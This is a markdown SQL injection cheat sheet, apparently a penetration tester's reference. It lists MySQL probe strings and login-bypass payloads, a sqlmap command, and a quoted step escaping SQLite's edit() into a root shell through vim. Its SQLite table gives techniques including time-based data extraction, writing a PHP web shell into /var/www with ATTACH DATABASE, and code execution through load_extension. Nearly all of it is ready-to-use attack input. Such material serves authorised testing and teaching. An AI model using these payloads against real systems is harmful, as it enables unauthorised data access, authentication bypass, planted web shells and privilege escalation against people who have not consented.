## MYSQL Testing Injection

* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`
    ```
    '	False
    ''	True
    "	False
    ""	True
    \	False
    \\	True
    ```

* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`
    ```ps1
    AND 1	    True
    AND 0	    False
    AND true	True
    AND false	False
    1-false	    Returns 1 if vulnerable
    1-true	    Returns 0 if vulnerable
    1*56	    Returns 56 if vulnerable
    1*56	    Returns 1 if not vulnerable
    ```

* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`
    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```
* **Further Attempt**:
   ```ps1
   food')/**/or/**/1=1#
   ```
* **edit() SQL function for escalation**:
   ```ps1
   Reference : https://0xdf.gitlab.io/2024/02/17/htb-drive.html#gitea
   sqlite> SELECT length(edit(img,'gimp')) WHERE id='pic-1542';
   oxdf@hacky$ VISUAL=cat sqlite3 db.sqlite3 'select "1" from accounts_customuser where username=""&edit(username)';
   hit enter, it open vim with the text “admin”. I’ll enter:!/bin/bash to execute bash from and it drops to a root shell:
   ```
* **sqlmap**
  ```
  sqlmap -r request_1.txt --force-ssl --dbs
  ```
# SQLite SQL Injection Cheat Sheet

|If you need                  |                                    You use                                      |
|-----------------------------|:-------------------------------------------------------------------------------:|
|Concatenation                |                                     \|\|                                        |
|Comments                     |                                      --                                         |
|Conditionals                 |  CASE WHEN key='value1' THEN 'something' WHEN key='value2' THEN 'somethingelse' |
|Substring                    |                          substr(string,start,stop)                              |
|Length                       |                              length(string)                                     |
|Quotes without literal quotes|              cast(X'27' as text)  *--use X'22' for double quotes*               |
|Table name enumeration       |               SELECT name FROM sqlite_master WHERE type='table'                 |
|Table schema enumeration     |                SELECT sql FROM sqlite_master WHERE type='table'                 |
|Time-based data extraction   |    cond='true' AND 1=randomblob(100000000) *--causes time delay if cond='true'* |
|File writing                 |1';ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd’]); ?>’;-- *--requires either direct database access or (non-default) stacked query option enabled*|
|Arbitrary Code Execution     |load\_extension(library\_file,entry\_point) *-- .dll for Windows, .so for 'nix. Requires non-default configuration*|


This work is based on http://atta.cked.me/home/sqlite3injectioncheatsheet
